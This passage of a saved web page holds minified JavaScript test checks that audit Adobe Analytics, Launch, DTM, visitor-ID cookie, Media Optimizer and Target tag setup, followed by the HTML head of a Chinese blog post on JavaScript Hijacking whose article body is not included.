d="",e=_modCookie.get(a),f="|";null!=c&&0<c.length&&c!==f&&(f=c);for(var g=decodeURIComponent(e).split(f),h=0;h<g.length;h++)g[h]===b&&(d=g[h+1]);return d},replace:function(a,b,c,d,e){var f="",g=_modCookie.get(a),h="|";null!=e&&0<e.length&&e!==h&&(h=e);for(var i=decodeURIComponent(g).split(h),j=0;j<i.length;j++)if(i[j]===b)return i[j+1]=c,f=encodeURIComponent(i.join(h)),_modCookie.set(a,f,d),c},remove:function(a){_modCookie.set(a,"",-1)}},_adobeVars.a4t={},_adobeVars.a4t.loaded=!0,describe("a4t Configuration",function(){}),_adobeVars.analytics={},_adobeVars.analytics.codeInstantiatedCount=0,_adobeVars.analytics.codeVersions=[];var AppMeasurementDefinedAsFunction="function"==typeof AppMeasurement;_adobeVars.analytics.codeLoaded=void 0!==window.s_gi||AppMeasurementDefinedAsFunction;var analyticsList=window.s_c_il;if(void 0!==analyticsList){for(var analyticsListLength=analyticsList.length,i=0;i<analyticsListLength;i++)AppMeasurementDefinedAsFunction&&analyticsList[i]instanceof AppMeasurement?(_adobeVars.analytics.codeInstantiatedCount+=1,_adobeVars.analytics.codeVersions.push(analyticsList[i].version)):"s_c"===analyticsList[i]._c&&(_adobeVars.analytics.codeInstantiatedCount+=1,_adobeVars.analytics.codeVersions.push(analyticsList[i].version));i=0;for(var len=_adobeVars.analytics.codeVersions.length;i<len;i++){var versionString=String(_adobeVars.analytics.codeVersions[i]);if(-1<versionString.indexOf("-")){var codeVersionArray=versionString.split("-");versionString=codeVersionArray[1]}if(_adobeVars.analytics.latestCodeLoaded=_compareVersion(versionString,_adobeVars.currentVersions.analytics),0<=_adobeVars.analytics.latestCodeLoaded)break}}if(describe("Adobe Analytics Configuration",function(){it("should be loaded in the DOM",function(a){_unitTestId="TEe98f4f22dd71484a97bd3e6484f1c101",expect(_adobeVars.analytics.codeLoaded).toEqual(!0),a()}),it("should be instantiated in the DOM",function(a){_unitTestId="TE5ea51084def54662b0e0a6e09837da29",expect(_adobeVars.analytics.codeInstantiatedCount).toBeGreaterThanOrEqual(1),a()}),it("should be instantiated only once in the DOM",function(a){_unitTestId="TEb824b26c0afb4195a1ca6155ad789627",expect(_adobeVars.analytics.codeInstantiatedCount).toEqual(1),a()}),it("should have the latest analytics code loaded in the page",function(a){_unitTestId="TE0c5954ddc277488c97218e5110d09b8d",expect(_adobeVars.analytics.latestCodeLoaded).toBeGreaterThanOrEqual(0),a()})}),_adobeVars.dtm={},_adobeVars.dtm.currentLib=typeof window._satellite,_adobeVars.dtm.prodScriptLoc=new Array,_adobeVars.dtm.stagingScriptLoc=new Array,_adobeVars.dtm.libScriptsInHead=document.querySelectorAll("head script[src*='satelliteLib']").length,_adobeVars.dtm.libScriptsInBody=document.querySelectorAll("body script[src*='satelliteLib']").length,_adobeVars.dtm.pageBottomNum=document.body.innerHTML.search("pageBottom"),_adobeVars.dtm.pageBottomIsLoaded=!1,_adobeVars.dtm.pageBottomNum<0?_adobeVars.dtm.pageBottomIsLoaded=!1:_adobeVars.dtm.pageBottomIsLoaded=!0,_adobeVars.dtm.pageBottomIsLoaded){_adobeVars.dtm.childrenInBody=document.body.children,_adobeVars.dtm.sourceChildrenInBody=[];for(var j=0;j<_adobeVars.dtm.childrenInBody.length;j++)if(_adobeVars.dtm.childrenInBody[j].tagName){console.log(_adobeVars.dtm.childrenInBody[j]);var currTagName=_adobeVars.dtm.childrenInBody[j].tagName.toLowerCase(),currTagIsIframe="iframe"==_adobeVars.dtm.childrenInBody[j].tagName.toLowerCase();if(currTagIsScript="script"==_adobeVars.dtm.childrenInBody[j].tagName.toLowerCase())var currScriptSrc=_adobeVars.dtm.childrenInBody[j].getAttribute("src");currTagIsIframe||currTagIsScript&&currScriptSrc&&-1!==currScriptSrc.indexOf("assets.adobedtm.com")||_adobeVars.dtm.sourceChildrenInBody.push(_adobeVars.dtm.childrenInBody[j])}for(_adobeVars.dtm.scriptsInBody=document.body.getElementsByTagName("script"),i=0;i<_adobeVars.dtm.scriptsInBody.length;i++)if(0<=_adobeVars.dtm.scriptsInBody[i].innerHTML.search("_satellite.pageBottom")){_adobeVars.dtm.pageBottomIsLastInBody=_adobeVars.dtm.scriptsInBody[i]===_adobeVars.dtm.sourceChildrenInBody[_adobeVars.dtm.sourceChildrenInBody.length-1];break}}for(_adobeVars.dtm.isSelfHosted=!1,_adobeVars.dtm.hostedDomain="assets.adobedtm.com",_adobeVars.dtm.prodIsSelfHosted=!1,_adobeVars.dtm.stageIsSelfHosted=!1,_adobeVars.dtm.scripts=document.querySelectorAll("script[src*='satelliteLib']"),i=0;i<_adobeVars.dtm.scripts.length;i++)-1===_adobeVars.dtm.scripts[i].src.indexOf("staging")&&_adobeVars.dtm.prodScriptLoc.push(i),-1!==_adobeVars.dtm.scripts[i].src.indexOf("staging")&&_adobeVars.dtm.stagingScriptLoc.push(i);if(0<_adobeVars.dtm.prodScriptLoc.length&&(_adobeVars.dtm.prodIsSelfHosted=-1===_adobeVars.dtm.scripts[_adobeVars.dtm.prodScriptLoc[0]].src.indexOf(_adobeVars.dtm.hostedDomain)),0<_adobeVars.dtm.stagingScriptLoc.length&&(_adobeVars.dtm.stageIsSelfHosted=-1===_adobeVars.dtm.scripts[_adobeVars.dtm.stagingScriptLoc[0]].src.indexOf(_adobeVars.dtm.hostedDomain)),_adobeVars.dtm.isSelfHosted=_adobeVars.dtm.prodIsSelfHosted||_adobeVars.dtm.stageIsSelfHosted,_adobeVars.dtm.exec3rdPartyTagsAsyncAfterDomReady=!0,_adobeVars.dtm.pageBottomFired=!1,"undefined"!=typeof _satellite){if(void 0!==_satellite.configurationSettings){var pageLoadRules=_satellite.configurationSettings.pageLoadRules,pageLoadRulesLength=pageLoadRules.length;if(0<pageLoadRulesLength){var currEvent="",currCommand="";for(i=0;i<pageLoadRulesLength;i++)if("object"==typeof pageLoadRules[i].trigger){if("loadBlockingScript"===(currCommand=pageLoadRules[i].trigger[0].command)){_adobeVars.dtm.exec3rdPartyTagsAsyncAfterDomReady=!1;break}if("writeHTML"===currCommand&&("pagetop"===(currEvent=pageLoadRules[i].event)||"pagebottom"===currEvent)){_adobeVars.dtm.exec3rdPartyTagsAsyncAfterDomReady=!1;break}}}}_adobeVars.dtm.pageBottomIsLoaded&&(_adobeVars.dtm.pageBottomFired=_satellite.pageBottomFired)}if(describe("Dynamic Tag Management Configuration",function(){it("should have a global _satellite object defined in the DOM",function(a){_unitTestId="TE981d1075617546cea58bedaac940c2b4",expect(_adobeVars.dtm.currentLib).toEqual("object"),a()}),it("should only have one embed script loaded in the head tag only",function(a){_unitTestId="TE4e531fc2293940f0a73ce92d49164c32",expect(_adobeVars.dtm.libScriptsInHead).toEqual(1),expect(_adobeVars.dtm.libScriptsInBody).toEqual(0),a()}),it("should have a pageBottom callback function defined in the body of the page",function(a){_unitTestId="TE6f8aa3efcee8481d94073244f1a7347e",expect(_adobeVars.dtm.pageBottomIsLoaded).toEqual(!0),a()}),it("should have a pageBottom callback function defined last in the body of the page",function(a){_unitTestId="TEa9df69942f404055a64262889c8b21d3",expect(_adobeVars.dtm.pageBottomIsLastInBody).toEqual(!0),a()}),it("should not have a library file be pulled from assets.adobedtm.com",function(a){_unitTestId="TE2b93c0ed95414225b26e69d10f91339a",expect(_adobeVars.dtm.isSelfHosted).toEqual(!0),a()}),it("should execute third party tags asynchronously and after DOM is ready",function(a){_unitTestId="TE25af49c97653412399cdea50e5a86256",expect(_adobeVars.dtm.exec3rdPartyTagsAsyncAfterDomReady).toEqual(!0),a()}),it("should have fired pageBottom",function(a){_unitTestId="TE60df6b34e5bb45fbae0609708869916b",expect(_adobeVars.dtm.pageBottomFired).toEqual(!0),a()})}),_adobeVars.launch={},_adobeVars.launch.currentLib=typeof window._satellite,_adobeVars.launch.prodScriptLoc=0,_adobeVars.launch.stagingScriptLoc=0,_adobeVars.launch.isAsync=!1,_adobeVars.launch.isMultiple=!1,_adobeVars.launch.libScripts=document.querySelectorAll("script[src*='launch-']").length,_adobeVars.launch.libScriptsInHead=document.querySelectorAll("head script[src*='launch-']").length,_adobeVars.launch.libScriptsInBody=document.querySelectorAll("body script[src*='launch-']").length,0<_adobeVars.launch.libScripts&&(_adobeVars.launch.isAsync=document.querySelectorAll("script[src*='launch-']")[0].async),1<_adobeVars.launch.libScripts&&(_adobeVars.launch.isMultiple=!0),"function"!=typeof window._satellite?(_adobeVars.launch.codeLoaded=!1,_adobeVars.launch.latestCodeLoaded=-1):(_adobeVars.launch.codeLoaded=!0,_adobeVars.launch.codeVersion=window._satellite.buildInfo.turbineVersion,_adobeVars.launch.latestCodeLoaded=_compareVersion(_adobeVars.launch.codeVersion,_adobeVars.currentVersions.launch)),_adobeVars.launch.pageBottomNum=document.body.innerHTML.search("pageBottom"),_adobeVars.launch.pageBottomIsLoaded=!1,_adobeVars.launch.pageBottomNum<0?_adobeVars.launch.pageBottomIsLoaded=!1:_adobeVars.launch.pageBottomIsLoaded=!0,_adobeVars.launch.pageBottomIsLoaded){for(_adobeVars.launch.childrenInBody=document.body.children,_adobeVars.launch.sourceChildrenInBody=[],j=0;j<_adobeVars.launch.childrenInBody.length;j++)if(_adobeVars.launch.childrenInBody[j].tagName){console.log(_adobeVars.launch.childrenInBody[j]);var currTagIsScript;currTagName=_adobeVars.launch.childrenInBody[j].tagName.toLowerCase(),currTagIsIframe="iframe"==_adobeVars.launch.childrenInBody[j].tagName.toLowerCase(),(currTagIsScript="script"==_adobeVars.launch.childrenInBody[j].tagName.toLowerCase())&&(currScriptSrc=_adobeVars.launch.childrenInBody[j].getAttribute("src")),currTagIsIframe||currTagIsScript&&currScriptSrc&&-1!==currScriptSrc.indexOf("assets.adobedtm.com")||_adobeVars.launch.sourceChildrenInBody.push(_adobeVars.launch.childrenInBody[j])}for(_adobeVars.launch.scriptsInBody=document.body.getElementsByTagName("script"),i=0;i<_adobeVars.launch.scriptsInBody.length;i++)if(0<=_adobeVars.launch.scriptsInBody[i].innerHTML.search("_satellite.pageBottom")){_adobeVars.launch.pageBottomIsLastInBody=_adobeVars.launch.scriptsInBody[i]===_adobeVars.launch.sourceChildrenInBody[_adobeVars.launch.sourceChildrenInBody.length-1];break}}for(_adobeVars.launch.isSelfHosted=!1,_adobeVars.launch.hostedDomain="assets.adobedtm.com",_adobeVars.launch.scripts=document.querySelectorAll("script[src*='launch-']"),1===_adobeVars.launch.libScripts&&-1===_adobeVars.launch.scripts[0].src.indexOf(_adobeVars.launch.hostedDomain)&&(_adobeVars.launch.isSelfHosted=!0),_adobeVars.launch.pageBottomFired=!1,"undefined"!=typeof _satellite&&"undefined"!=typeof _satellite&&_adobeVars.launch.pageBottomIsLoaded&&(_adobeVars.launch.pageBottomFired=_satellite.pageBottomFired),describe("Launch Configuration",function(){it("should have a global _satellite object defined in the DOM",function(a){_unitTestId="TEc8600515c93446ba85e9923491a8a2d9",expect(_adobeVars.launch.currentLib).toEqual("object"),a()}),it("should have latest Launch code (Turbine) loaded in the page",function(a){_unitTestId="TEa20cd73613f24ed5a33025eca13fe2e2",expect(_adobeVars.launch.latestCodeLoaded).toBeGreaterThanOrEqual(0),a()}),it("should not have multiple embed scripts loaded on the page",function(a){_unitTestId="TE13cbda7d29a14af8819efea294984ca3",expect(_adobeVars.launch.isMultiple).toEqual(!1),a()}),it("should have a pageBottom callback function defined in the body of the page for synchronous deployment",function(a){_unitTestId="TEdd932a2c8dd54c5c8ed9ed086cfaafa5",_adobeVars.launch.isAsync?expect(!0).toEqual(!0):expect(_adobeVars.launch.pageBottomIsLoaded).toEqual(!0),a()}),it("should have a pageBottom callback function defined last in the body of the page for synchronous deployment",function(a){_unitTestId="TE48c499b022f545c5bccc6f8bde169685",_adobeVars.launch.isAsync?expect(!0).toEqual(!0):expect(_adobeVars.launch.pageBottomIsLastInBody).toEqual(!0),a()}),it("should be asynchronously deployed",function(a){_unitTestId="TE46553c7a7a6a4ae4b0e39a61e108d2eb",expect(_adobeVars.launch.isAsync).toEqual(!0),a()}),it("should not have a pageBottom callback function defined for an asynchronous deployment",function(a){_unitTestId="TEde9a10768dab476f85690b42a02a81c7",_adobeVars.launch.isAsync?expect(_adobeVars.launch.pageBottomIsLoaded).toEqual(!1):expect(!0).toEqual(!0),a()}),it("should not have a library file be pulled from assets.adobedtm.com",function(a){_unitTestId="TE931cdbf1e506487ea48d84b4458f1aa6",expect(_adobeVars.launch.isSelfHosted).toEqual(!0),a()})}),_adobeVars.mcid={},"function"!=typeof window.Visitor?(_adobeVars.mcid.codeLoaded=!1,_adobeVars.mcid.latestCodeLoaded=-1):(_adobeVars.mcid.codeLoaded=!0,_adobeVars.mcid.codeVersion=window.Visitor.version,_adobeVars.mcid.latestCodeLoaded=_compareVersion(_adobeVars.mcid.codeVersion,_adobeVars.currentVersions.visitor)),_adobeVars.mcid.cookieName=encodeURIComponent("AMCV_"),_adobeVars.mcid.amcvCookies=[],_adobeVars.mcid.allCookies=document.cookie.split(";"),i=0;i<_adobeVars.mcid.allCookies.length;i++){for(var c=_adobeVars.mcid.allCookies[i];" "==c.charAt(0);)c=c.substring(1);0==c.indexOf(_adobeVars.mcid.cookieName)&&_adobeVars.mcid.amcvCookies.push(c)}_adobeVars.mcid._MCIDOrg=_adobeVars.mcid.amcvCookies[0],_adobeVars.mcid.mid="",void 0!==_adobeVars.mcid._MCIDOrg&&(_adobeVars.mcid._MCIDOrg=_adobeVars.mcid._MCIDOrg.split("=")[0],_adobeVars.mcid.mid=_modCookie.search(_adobeVars.mcid._MCIDOrg,"MCMID")),describe("MCID Configuration",function(){it("should have MCID code loaded in the page",function(a){_unitTestId="TE0b98be6f92b847e0840717490174fce7",expect(_adobeVars.mcid.codeLoaded).toEqual(!0),a()}),it("should have latest MCID code loaded in the page",function(a){_unitTestId="TE012b02113be64df69b3322c874816eef",expect(_adobeVars.mcid.latestCodeLoaded).toBeGreaterThanOrEqual(0),a()}),it("should have AMCV_ cookie defined in the page",function(a){_unitTestId="TE8950b5e56b9c442eb03e2c48758c9c2e",expect(_adobeVars.mcid.amcvCookies.length).toBeGreaterThan(0),a()}),it("should only have one AMCV_ cookie defined in the page",function(a){_unitTestId="TE6814b2dde9384f3e8f1ab5b3ac1b0818",expect(_adobeVars.mcid.amcvCookies.length).toEqual(1),a()}),it("should have MID defined in the AMCV_ cookie",function(a){_unitTestId="TE9679133761f14be992c2c478681561cc",expect(_adobeVars.mcid.mid).not.toBe(""),a()})}),_adobeVars.amo={},_adobeVars.amo.loaded=!1,_adobeVars.amo.oldJavascriptTagOnPage=!1,_adobeVars.amo.oldSegmentPixelOnPage=!1,_adobeVars.amo.segmentPixelEvTransidUsedButEmpty=!1,_adobeVars.amo.segmentPixelEvPropertyNumericOrDecimal=!0,_adobeVars.amo.segmentPixelQueryExtraQuestionMark=!1,_adobeVars.amo.segmentPixelQueryParamNameContainsAmpersand=!1,_adobeVars.amo.specifiesDSPSyncSetting=!0,_adobeVars.amo.scriptsV1InPage=document.querySelectorAll("script[src*='www.everestjs.net/static/st.js']"),_adobeVars.amo.scriptsV2InPage=document.querySelectorAll("script[src*='www.everestjs.net/static/st.v2.js']"),_adobeVars.amo.scriptsV3InPage=document.querySelectorAll("script[src*='www.everestjs.net/static/st.v3.js']"),(0<_adobeVars.amo.scriptsV1InPage.length||0<_adobeVars.amo.scriptsV2InPage.length)&&(_adobeVars.amo.oldJavascriptTagOnPage=!0,_adobeVars.amo.loaded=!0),0<_adobeVars.amo.scriptsV3InPage.length&&(_adobeVars.amo.loaded=!0),_adobeVars.amo.segmentPixelsOnPage={},_adobeVars.amo.segmentPixelsOnPage.jsdl=document.querySelectorAll("script[src*='www.everestjs.net/dl']"),_adobeVars.amo.segmentPixelsOnPage.pixel=document.querySelectorAll("img[src*='pixel.everesttech.net/']"),_adobeVars.amo.segmentPixelsOnPage.tubemogul=document.querySelectorAll("img[src*='rtd.tubemogul.com/upi/']"),_adobeVars.amo.segmentPixelsOnPage.rtd_tm=document.querySelectorAll("img[src*='rtd-tm.everesttech.net/upi/']")
;var currSrc,currPageAndParams,currParams,currParam,currQryHasSidParam,currQryHasCsParam,numericRegEx=/^[1-9]\d*$/,latestSegmentPixelFormat=[];if(0<_adobeVars.amo.segmentPixelsOnPage.jsdl.length){_adobeVars.amo.loaded=!0;var jsdlLength=_adobeVars.amo.segmentPixelsOnPage.jsdl.length,jsFileRegEx=/[0-9]+\-[0-9]+\.js/;if(!_adobeVars.amo.oldSegmentPixelOnPage)for(i=0;i<jsdlLength;i++)if(currSrc=_adobeVars.amo.segmentPixelsOnPage.jsdl[i].getAttribute("src").split("/"),numericRegEx.test(currSrc[4])&&jsFileRegEx.test(currSrc[5])){_adobeVars.amo.oldSegmentPixelOnPage=!0;break}}if(0<_adobeVars.amo.segmentPixelsOnPage.pixel.length){_adobeVars.amo.loaded=!0;var currQryIsPx2,currQryIsPx2WithPropertyS,currQryIsPx2WithPropertyPxEvt,currQryIsPx2WithPropertyPxEvtWithValueS,pixelLength=_adobeVars.amo.segmentPixelsOnPage.pixel.length,leadVRegEx=/^v\\?/,leadEvPropRegEx=/^ev\_/,numericOrDecimalRegEx=/^[1-9]\d*(\.\d+)?$/;for(i=0;i<pixelLength;i++)if(currQryIsPx2WithPropertyPxEvtWithValueS=currQryIsPx2WithPropertyPxEvt=currQryHasCsParam=currQryHasSidParam=currQryIsPx2WithPropertyS=currQryIsPx2=!1,currSrc=_adobeVars.amo.segmentPixelsOnPage.pixel[i].getAttribute("src").split("/"),numericRegEx.test(currSrc[3])&&leadVRegEx.test(currSrc[4])&&(_adobeVars.amo.oldSegmentPixelOnPage=!0),currParams=(currPageAndParams=currSrc[currSrc.length-1].split("?"))[1].split("&"),2<currPageAndParams.length)_adobeVars.amo.segmentPixelQueryExtraQuestionMark=!0;else{for(j=0;j<currParams.length;j++)""!==currParams[j]&&currParams[j].indexOf("=")<0&&(_adobeVars.amo.segmentPixelQueryParamNameContainsAmpersand=!0),currParam=currParams[j].split("="),"px2"!==currSrc[3]||numericRegEx.test(currPageAndParams[0])||latestSegmentPixelFormat.push(!1),"px2"===currSrc[3]&&numericRegEx.test(currPageAndParams[0])&&(currQryIsPx2=!0,"px_evt"===currParam[0]&&(currQryIsPx2WithPropertyPxEvt=!0,"s"===currParam[1]&&(currQryIsPx2WithPropertyPxEvtWithValueS=!0)),"s"===currParam[0]&&numericRegEx.test(currParam[1])&&(currQryIsPx2WithPropertyS=!0),"sid"===currParam[0]&&(currQryHasSidParam=!0),"cs"!==currParam[0]||"0"!==currParam[1]&&"1"!==currParam[1]||(currQryHasCsParam=!0)),"ev_transid"===currParam[0]?""===currParam[1]&&(_adobeVars.amo.segmentPixelEvTransidUsedButEmpty=!0):leadEvPropRegEx.test(currParam[0])&&(numericOrDecimalRegEx.test(currParam[1])||(_adobeVars.amo.segmentPixelEvPropertyNumericOrDecimal=!1));currQryIsPx2&&(currQryIsPx2WithPropertyPxEvt?currQryIsPx2WithPropertyPxEvtWithValueS?latestSegmentPixelFormat.push(currQryIsPx2WithPropertyS):latestSegmentPixelFormat.push(!0):currQryIsPx2WithPropertyS&&(_adobeVars.amo.oldSegmentPixelOnPage=!0)),currQryHasSidParam&&!currQryHasCsParam&&(_adobeVars.amo.specifiesDSPSyncSetting=!1)}}var hashRegEx=/^[a-zA-Z0-9]{20}$/,_checkTubeMogulElements=function(a){var b,c,d,e;if(0<a.length){_adobeVars.amo.loaded=!0;for(var f=a.length,g=0;g<f;g++)if(currQryHasCsParam=currQryHasSidParam=!1,d=(c=(b=a[g].getAttribute("src").split("/"))[b.length-1].split("?"))[1].split("&"),2<c.length)_adobeVars.amo.segmentPixelQueryExtraQuestionMark=!0;else{for(var h=0;h<d.length;h++)""!==d[h]&&d[h].indexOf("=")<0&&(_adobeVars.amo.segmentPixelQueryParamNameContainsAmpersand=!0),"ev_transid"===(e=d[h].split("="))[0]&&""===e[1]&&(_adobeVars.amo.segmentPixelEvTransidUsedButEmpty=!0),"sid"===e[0]&&(currQryHasSidParam=!0,latestSegmentPixelFormat.push(hashRegEx.test(e[1]))),"cs"!==e[0]||"0"!==e[1]&&"1"!==e[1]||(currQryHasCsParam=!0);currQryHasSidParam&&!currQryHasCsParam&&(_adobeVars.amo.specifiesDSPSyncSetting=!1)}}};_checkTubeMogulElements(_adobeVars.amo.segmentPixelsOnPage.tubemogul),_checkTubeMogulElements(_adobeVars.amo.segmentPixelsOnPage.rtd_tm),_adobeVars.amo.tubeMogulConversionPixelsOnPageLength=document.querySelectorAll("img[src*='conv-tm.everesttech.net/stats/1/conv?']").length;var latestSegmentPixelFormatLength=latestSegmentPixelFormat.length;if(0<latestSegmentPixelFormatLength){for(_adobeVars.amo.latestSegmentPixelFormatOnPage=!0,i=0;i<latestSegmentPixelFormatLength;i++)if(!latestSegmentPixelFormat[i]){_adobeVars.amo.latestSegmentPixelFormatOnPage=!1;break}}else _adobeVars.amo.latestSegmentPixelFormatOnPage=!_adobeVars.amo.oldSegmentPixelOnPage;describe("Adobe Media Optimizer Configuration",function(){it("should be defined in the DOM",function(a){_unitTestId="TE29ccb6a731e742c8a9cb048d7bbb3722",expect(_adobeVars.amo.loaded).toEqual(!0),a()}),it("should not use old javascript tags",function(a){_unitTestId="TE9739a1ca6c33458889ac0a11ca9dad86",expect(_adobeVars.amo.oldJavascriptTagOnPage).toEqual(!1),a()}),it("should not use old segment pixel",function(a){_unitTestId="TE4b9b4d79e4db4ed9adea8d0cb2debf8a",expect(_adobeVars.amo.oldSegmentPixelOnPage).toEqual(!1),a()}),it("should not use old TubeMogul conversion pixel",function(a){_unitTestId="TE2d937efd50414c4090c8a599500caaf9",expect(_adobeVars.amo.tubeMogulConversionPixelsOnPageLength).toEqual(0),a()}),it("should not use segment pixel with empty ev_transid property",function(a){_unitTestId="TE2bffbe3c2fce47bfac1983d10585d6fe",expect(_adobeVars.amo.segmentPixelEvTransidUsedButEmpty).toEqual(!1),a()}),it("should use segment pixel with only numeric or decimal ev_ transaction property values",function(a){_unitTestId="TE56fa472f63894d45b9c81969266f63be",expect(_adobeVars.amo.segmentPixelEvPropertyNumericOrDecimal).toEqual(!0),a()}),it("should use segment pixel with well formed query params with no extra ? or & characters in parameter names",function(a){_unitTestId="TEd25f0337924b4adda9de6d083180407f",expect(_adobeVars.amo.segmentPixelQueryExtraQuestionMark).toEqual(!1),expect(_adobeVars.amo.segmentPixelQueryParamNameContainsAmpersand).toEqual(!1),a()}),it("should use latest segment pixel format",function(a){_unitTestId="TE2ed673b92a88422499ea2be965f1b6ff",expect(_adobeVars.amo.latestSegmentPixelFormatOnPage).toEqual(!0),a()}),it("should use DSP syncing setting with TubeMogul segment pixel",function(a){_unitTestId="TE3f385cee6e354afc971523426d40d0b4",expect(_adobeVars.amo.specifiesDSPSyncSetting).toEqual(!0),a()})}),_adobeVars.target={},_adobeVars.target.loaded=!1,_adobeVars.target.timeout=0,_adobeVars.target.crossDomain="",_adobeVars.target.bodyHidingEnabledWhenGlobalMboxAutoCreate=!1;var mboxCreateNode=-1,mboxDefaultNode=-1,_setMboxCreateNodeParent=function a(b){if(b.innerHTML.includes("mboxCreate(")&&(currentNodeLength=b.children.length,0<currentNodeLength)){_adobeVars.target.mboxCreateNodeParent=b;for(var c=0;c<currentNodeLength;c++)a(b.children[c])}};if(_adobeVars.target.mboxCreateNodeParent="",_setMboxCreateNodeParent(document.documentElement.getElementsByTagName("body")[0]),""!==_adobeVars.target.mboxCreateNodeParent){for(mboxCreateNodeParentNodesLength=_adobeVars.target.mboxCreateNodeParent.children.length,_adobeVars.target.defaultPrecedesCreate=mboxCreateNodeParentNodesLength,i=0;i<mboxCreateNodeParentNodesLength;i++)if(currNodeInnerHtml=_adobeVars.target.mboxCreateNodeParent.children[i].innerHTML.toString(),currNodeInnerHtml.includes("mboxCreate(")){mboxCreateNode=i;break}0<mboxCreateNode?(mboxDefaultNode=mboxCreateNode-1,_adobeVars.target.defaultPrecedesCreate=!1):0===mboxCreateNode&&(_adobeVars.target.defaultPrecedesCreate=!1)}else _adobeVars.target.defaultPrecedesCreate=!0;_adobeVars.target.mboxDefaultNodeHasContentWithAtJs=!0,"undefined"!=typeof adobe&&""!==adobe&&void 0!==adobe.target&&""!==adobe.target?(_adobeVars.target.pageRenderedInStandardsMode="BackCompat"!==document.compatMode,_adobeVars.target.codeVersion=adobe.target.VERSION,_adobeVars.target.loaded=!0,_adobeVars.target.latestCodeLoaded=_compareVersion(_adobeVars.target.codeVersion,_adobeVars.currentVersions.target),0<=mboxDefaultNode&&_adobeVars.target.mboxCreateNodeParent.children[mboxDefaultNode].className.includes("mbox-name-")&&(_adobeVars.target.mboxCreateNodeParent.children[mboxDefaultNode].className.includes("at-element-marker")||_adobeVars.target.mboxCreateNodeParent.children[mboxDefaultNode].className.includes("mboxDefault"))&&(_adobeVars.target.defaultPrecedesCreate=!0,""===_adobeVars.target.mboxCreateNodeParent.children[mboxDefaultNode].textContent.trim()&&0===_adobeVars.target.mboxCreateNodeParent.children[mboxDefaultNode].children.length&&(_adobeVars.target.mboxDefaultNodeHasContentWithAtJs=!1))):"undefined"!=typeof TNT&&""!==TNT?(_adobeVars.target.pageRenderedInStandardsMode=!0,_adobeVars.target.loaded=!0,_adobeVars.target.latestCodeLoaded=-1,0<=mboxDefaultNode&&"mboxDefault"===_adobeVars.target.mboxCreateNodeParent.children[mboxDefaultNode].className&&(_adobeVars.target.defaultPrecedesCreate=!0),void 0!==TNT.a&&""!==TNT.a&&void 0!==TNT.a.b&&""!==TNT.a.b&&(_adobeVars.target.timeout=TNT.a.b.mboxTimeout,_adobeVars.target.crossDomain=TNT.a.b.crossDomain,TNT.a.b.globalMboxAutoCreate?_adobeVars.target.bodyHidingEnabledWhenGlobalMboxAutoCreate=TNT.a.b.bodyHidingEnabled:_adobeVars.target.bodyHidingEnabledWhenGlobalMboxAutoCreate=!0)):_adobeVars.target.loaded=-1<document.documentElement.innerHTML.indexOf("mbox-contents-");var _targetScriptIsSrc=function(a){for(var b=a.length,c=0;c<b;c++)if(currNode=a[c],currNode.hasAttribute("src")&&(currNodeSrcAttribute=currNode.getAttribute("src"),currNodeSrcAttribute.includes("mbox.js")||currNodeSrcAttribute.includes("at.js")||currNodeSrcAttribute.includes("mbox-contents-")))return!0;return!1};_adobeVars.target.scriptInHead=_targetScriptIsSrc(document.documentElement.getElementsByTagName("head")[0].getElementsByTagName("script")),_adobeVars.target.scriptInBody=_targetScriptIsSrc(document.documentElement.getElementsByTagName("body")[0].getElementsByTagName("script")),void 0!==_adobeVars.launch.libScriptsInHead&&0<_adobeVars.launch.libScriptsInHead&&!1===_adobeVars.target.scriptInHead&&!0===_adobeVars.target.loaded&&(_adobeVars.target.scriptInHead=!0),describe("Adobe Target Configuration",function(){it("should be defined in the DOM",function(a){_unitTestId="TE75737b68e3e54c36810d45f98f7f1e55",expect(_adobeVars.target.loaded).toEqual(!0),a()}),it("should have latest Target code (at.js) loaded in the page",function(a){_unitTestId="TEa6a62a187f9044408b9ebcfe5573eb73",expect(_adobeVars.target.latestCodeLoaded).toBeGreaterThanOrEqual(0),a()}),it("should have mboxDefault preceding mboxCreate when mboxCreate is used",function(a){_unitTestId="TE0b31d32ea04c4827ad2c4070b9b89ddf",expect(_adobeVars.target.defaultPrecedesCreate).toEqual(!0),a()}),it("should have content in mboxDefault with at.js implementation",function(a){_unitTestId="TEf6408a7d9199412abe8474018ceb9d6c",expect(_adobeVars.target.mboxDefaultNodeHasContentWithAtJs).toEqual(!0),a()}),it("should have library loaded in <head>, not in <body>",function(a){_unitTestId="TE61c380082a4b4706b28a84aa047599a7",expect(_adobeVars.target.scriptInHead).toEqual(!0),expect(_adobeVars.target.scriptInBody).toEqual(!1),a()}),it("should use a valid doc type (page rendered in standards mode)",function(a){_unitTestId="TE7f4c9d145e8840fb8cc49854fbb8bc8b",expect(_adobeVars.target.pageRenderedInStandardsMode).toEqual(!0),a()})}),runSpecs()}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="referrer" content="origin">
    <meta http-equiv="Cache-Control" content="no-transform">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <title>深入理解JavaScript Hijacking原理 - hyddd - 博客园</title>
    <meta property="og:description" content="    最近在整理关于JavaScript代码安全方面的资料，在查关于JackScript Hijacking的资料时，发现关于它的中文资料很少，故特意整理一下。">
    <link type="text/css" rel="stylesheet" href="./20190721JSHijacking_files/blog-common.css">
<link id="MainCss" type="text/css" rel="stylesheet" href="./20190721JSHijacking_files/bundle-Minyx2_Lite.css">
<link type="text/css" rel="stylesheet" href="./20190721JSHijacking_files/49647.css">
<link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="./20190721JSHijacking_files/bundle-Minyx2_Lite-mobile.css">
    <link title="RSS" type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/hyddd/rss">
    <link title="RSD" type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/hyddd/rsd.xml">
<link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/hyddd/wlwmanifest.xml">
    <script src="./20190721JSHijacking_files/jquery-2.2.0.min.js.下载"></script>
    <script>var currentBlogId=49647;var currentBlogApp='hyddd',cb_enable_mathjax=false;var isLogined=false;</script>
    <script src="./20190721JSHijacking_files/blog-common.js.下载" type="text/javascript"></script>
<script src="./20190721JSHijacking_files/bundle-Minyx2_Lite.js.下载" language="javascript" type="text/javascript"></script>
